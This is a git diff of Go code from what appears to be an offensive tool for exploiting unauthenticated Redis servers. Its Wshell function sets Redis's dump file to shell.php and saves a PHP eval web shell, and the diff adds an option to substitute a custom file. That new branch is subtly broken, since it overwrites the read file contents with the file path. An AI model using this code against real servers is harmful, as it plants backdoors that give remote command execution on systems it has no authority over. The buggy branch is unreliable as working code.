@@ -2,6 +2,7 @@ package cmdpackage
 
 import (
 	"Rpcon/common"
+	"Rpcon/pkg"
 	"bufio"
 	"context"
 	"fmt"
@@ -10,6 +11,8 @@ import (
 	"strconv"
 	"strings"
 )
+
+var s string
 
 func con() (*redis.Client, context.Context) {
 
@@ -116,7 +119,13 @@ func Wshell() {
 		val3 := rdb.Do(ctx, "config", "set", "dbfilename", "shell.php").String()
 		fmt.Printf("\n" + val3)
 		if strings.Contains(val3, "OK") {
-			val4 := rdb.Do(ctx, "set", "xxx", "\r\n\r\n<?php eval($_POST[whoami]);?>\r\n\r\n").String()
+			if common.File != "" {
+				s, _ = pkg.Readfile(common.File)
+				s = fmt.Sprintf("\r\n\r\n%s\r\n\r\n", common.File)
+			} else {
+				s = "\r\n\r\n<?php eval($_POST[whoami]);?>\r\n\r\n"
+			}
+			val4 := rdb.Do(ctx, "set", "xxx", s).String()
 			fmt.Println("\n" + val4)
 			if strings.Contains(val4, "OK") {
 				_, err := rdb.Do(ctx, "save").Result()
